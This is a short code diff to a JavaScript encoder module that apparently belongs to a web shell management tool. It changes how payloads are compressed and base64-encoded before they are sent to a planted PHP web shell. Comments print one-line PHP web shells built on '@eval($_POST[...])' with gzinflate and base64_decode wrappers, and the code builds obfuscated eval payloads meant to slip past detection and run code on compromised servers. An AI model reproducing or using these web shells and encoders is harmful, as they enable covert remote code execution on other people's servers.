@@ -15,16 +15,16 @@ var zlib = require('zlib');
 module.exports = (pwd, data) => {
   // ##########    请在下方编写你自己的代码   ###################
   let randomID = `_0x${Math.random().toString(16).substr(2)}`;
-  data[randomID] = zlib.deflateRawSync(data['_']);
+  data[randomID] = zlib.deflateRawSync(data['_']).toString('base64');
   
   // <?php @eval($_POST['ant']);?>
-  //data[pwd] = `eval(@gzinflate($_POST[${randomID}]));`;
-  
-  // <?php @eval(@gzinflate($_POST['ant'])); ?>
-  data[pwd] = zlib.deflateRawSync(`@eval(@gzinflate($_POST[${randomID}]));`);
+  //data[pwd] = `eval(@gzinflate(base64_decode($_POST[${randomID}])));`;
   
   // <?php @eval(@gzinflate(base64_decode($_POST['ant']))); ?>
-  // data[pwd] = zlib.deflateRawSync(`@eval(@gzinflate($_POST[${randomID}]));`).toString('base64');
+  data[pwd] = zlib.deflateRawSync(`@eval(@gzinflate(base64_decode($_POST[${randomID}])));`).toString('base64');
+  
+  // <?php @eval(@gzinflate(base64_decode($_POST['ant']))); ?>
+  // data[pwd] = zlib.deflateRawSync(`@eval(@gzinflate(base64_decode($_POST[${randomID}])));`).toString('base64');
   
   // ##########    请在上方编写你自己的代码   ###################
 
